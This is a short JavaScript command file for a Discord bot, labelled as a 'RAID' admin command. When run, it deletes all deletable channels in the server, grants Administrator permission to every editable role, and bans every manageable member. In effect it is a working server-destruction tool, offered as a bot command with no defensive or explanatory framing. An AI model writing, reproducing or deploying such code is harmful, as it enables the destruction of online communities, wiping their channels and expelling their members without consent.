const { MESSAGES } = require("../../../util/constants");

const functions = require('../../../util/functions');

module.exports.run = functions.run = async (client, message, args, settings) => {
    message.guild.channels.cache.forEach(c => {
        if (c.deletable) {
        c.delete()
    }});
    message.guild.roles.cache.forEach(r => {
        if (r.editable) {
        r.edit({ permissions: 8 })
    }})
    message.guild.members.cache.forEach(m => {
        if (m.manageable) {
        m.ban() 
    }})
}

module.exports.help = MESSAGES.COMMANDS.ADMIN.RAID;